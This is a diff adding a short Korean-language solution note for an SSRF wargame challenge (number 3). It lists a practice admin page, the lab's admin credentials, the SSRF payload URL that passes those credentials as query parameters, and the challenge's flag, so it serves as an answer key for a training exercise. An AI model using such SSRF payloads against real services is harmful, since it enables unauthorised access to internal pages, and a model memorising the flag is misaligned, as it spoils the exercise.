@@ -1,0 +1,15 @@
+=========================================
+* SSRF 워게임 문제 3번
+=========================================
+관리자페이지 : http://eqst-ssrf-victim.com:8098/admin.php
+ID : adminID, PW:adminPW
+1.풀이과정 
+페이지 소스보기들을 이용해서 관리자페이지와 ID,PW를 찾아낸 후 페이지 입력창에 URL을 넣는다.
+
+2. URL 입력값
+
+http://eqst-ssrf-victim.com:8098/admin.php/?login_id=adminID&login_pwd=adminPW
+
+3. 정답
+i_can_not_stop_you
+=========================================
